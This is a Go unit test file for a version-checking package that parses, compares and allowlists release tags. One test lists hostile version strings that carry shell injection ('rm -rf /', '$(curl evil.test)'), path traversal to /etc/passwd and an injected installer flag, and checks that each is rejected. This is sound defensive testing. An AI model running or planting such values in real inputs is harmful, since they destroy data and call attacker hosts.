// SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

package updatecheck

import (
	"testing"
)

// Verifies a version that is not purely a version is refused before it can
// reach a URL or the installer's argument list.
//
// parseVersion is not a sufficient check on its own: it drops build metadata
// before parsing and does not constrain prerelease identifiers, so every input
// below parses as a valid semantic version. Only the tag allowlist stops them.
func TestReleaseTagRejectsHostileVersions(t *testing.T) {
	hostile := []string{
		"1.0.0-;rm -rf /",
		"1.0.0-$(curl evil.test)",
		"1.0.0-`id`",
		"1.0.0-\"; evil; \"",
		"1.0.0+../../../../etc/passwd",
		"1.0.0-../../foo",
		"1.0.0-a\nb",
		"1.0.0- --install-dir=/tmp/evil",
		"1.0.0-a b",
	}

	for _, version := range hostile {
		if _, err := parseVersion(version); err != nil {
			t.Fatalf("precondition: %q was expected to parse as a version, got %v", version, err)
		}
		tag, err := ReleaseTag(version)
		if err == nil {
			t.Fatalf("ReleaseTag(%q) returned %q, want a rejection", version, tag)
		}
	}

	// The tags releases actually carry must still be accepted.
	for _, version := range []string{"1.2.3", "v1.2.3", "V1.2.3", "1.2.3-rc.1", "1.2.3+build.7", "1.2"} {
		if _, err := ReleaseTag(version); err != nil {
			t.Fatalf("ReleaseTag(%q) failed: %v", version, err)
		}
	}
}

func TestIsSame(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{a: "v1.2.0", b: "1.2.0", want: true},
		{a: "v1.2.0+build.7", b: "v1.2.0", want: true},
		{a: "v1.2", b: "v1.2.0", want: true},
		{a: "v1.2.0", b: "v1.2.1"},
		{a: "v1.2.0-rc.1", b: "v1.2.0"},
	}

	for _, test := range tests {
		got, err := IsSame(test.a, test.b)
		if err != nil {
			t.Fatalf("IsSame(%q, %q) failed: %v", test.a, test.b, err)
		}
		if got != test.want {
			t.Fatalf("IsSame(%q, %q) = %v, want %v", test.a, test.b, got, test.want)
		}
	}

	if _, err := IsSame("dev", "1.0.0"); err == nil {
		t.Fatal("expected an unparseable version to error")
	}
}

func TestIsNewer(t *testing.T) {
	tests := []struct {
		candidate string
		current   string
		want      bool
	}{
		{candidate: "v1.0.1", current: "v1.0.0", want: true},
		{candidate: "v1.1.0", current: "v1.0.9", want: true},
		{candidate: "v2.0.0", current: "v1.99.99", want: true},
		{candidate: "v1.0.0", current: "v1.0.0"},
		{candidate: "v1.0.0", current: "v1.0.1"},
		// Numeric prerelease identifiers compare numerically, not lexically, so
		// rc.10 outranks rc.9 rather than sorting before it.
		{candidate: "v1.0.0-rc.10", current: "v1.0.0-rc.9", want: true},
		{candidate: "v1.0.0-rc.9", current: "v1.0.0-rc.10"},
		{candidate: "v1.0.0", current: "v1.0.0-rc.8", want: true},
		{candidate: "v1.0.0-rc.8", current: "v1.0.0"},
		{candidate: "v1.0.0-beta", current: "v1.0.0-alpha", want: true},
		{candidate: "v1.0.0-rc.1.1", current: "v1.0.0-rc.1", want: true},
		// Build metadata is not part of precedence.
		{candidate: "v1.0.0+build.9", current: "1.0.0"},
		// Short forms fill missing components with zero.
		{candidate: "v1.1", current: "v1.0.9", want: true},
		{candidate: "v1", current: "v1.0.0"},
	}

	for _, test := range tests {
		t.Run(test.candidate+" vs "+test.current, func(t *testing.T) {
			got, err := IsNewer(test.candidate, test.current)
			if err != nil {
				t.Fatalf("IsNewer failed: %v", err)
			}
			if got != test.want {
				t.Fatalf("IsNewer(%q, %q) = %v, want %v", test.candidate, test.current, got, test.want)
			}
		})
	}
}

func TestIsReleaseVersion(t *testing.T) {
	valid := []string{"1.0.0", "v1.0.0", "v1.0.0-rc.1", "v1.0.0+build", "1.2", "1"}
	invalid := []string{"", "dev", "unknown", "v", "1.2.3.4", "1.x.0", "v1.0.0-", "v-1.0.0"}

	for _, value := range valid {
		if !IsReleaseVersion(value) {
			t.Fatalf("expected %q to parse as a release version", value)
		}
	}
	for _, value := range invalid {
		if IsReleaseVersion(value) {
			t.Fatalf("expected %q not to parse as a release version", value)
		}
	}
}

func TestNumericPrereleaseIdentifiersWithDifferentFormattingCompareEqual(t *testing.T) {
	for _, versions := range [][2]string{
		{"1.0.0-01", "1.0.0-1"},
		{"1.0.0-1", "1.0.0-01"},
	} {
		t.Run(versions[0]+"_and_"+versions[1], func(t *testing.T) {
			same, err := IsSame(versions[0], versions[1])
			if err != nil || !same {
				t.Errorf("IsSame(%q, %q) = %t, %v; want true, nil", versions[0], versions[1], same, err)
			}
			newer, err := IsNewer(versions[0], versions[1])
			if err != nil || newer {
				t.Errorf("IsNewer(%q, %q) = %t, %v; want false, nil", versions[0], versions[1], newer, err)
			}
		})
	}
}

func TestIsNewerVersionBoundaries(t *testing.T) {
	cases := []struct {
		name, candidate, current string
		want                     bool
		wantError                bool
	}{
		{"numeric before alphanumeric", "1.0.0-1", "1.0.0-alpha", false, false},
		{"alphanumeric after numeric", "1.0.0-alpha", "1.0.0-1", true, false},
		{"alpha before beta", "1.0.0-alpha", "1.0.0-beta", false, false},
		{"beta after alpha", "1.0.0-beta", "1.0.0-alpha", true, false},
		{"invalid candidate", "invalid", "1.0.0", false, true},
		{"invalid current", "1.0.0", "invalid", false, true},
		{"numeric component out of range", "99999999999999999999.0.0", "1.0.0", false, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := IsNewer(tc.candidate, tc.current)
			if (err != nil) != tc.wantError {
				t.Errorf("error = %v, want error = %t", err, tc.wantError)
			}
			if got != tc.want {
				t.Errorf("IsNewer(%q, %q) = %t, want %t", tc.candidate, tc.current, got, tc.want)
			}
		})
	}
}

func TestDisplayVersionBoundaries(t *testing.T) {
	for _, tc := range []struct{ input, want string }{
		{" \t\n", "unknown"},
		{" V1.2.3 ", "V1.2.3"},
	} {
		t.Run(tc.want, func(t *testing.T) {
			if got := DisplayVersion(tc.input); got != tc.want {
				t.Errorf("DisplayVersion(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}
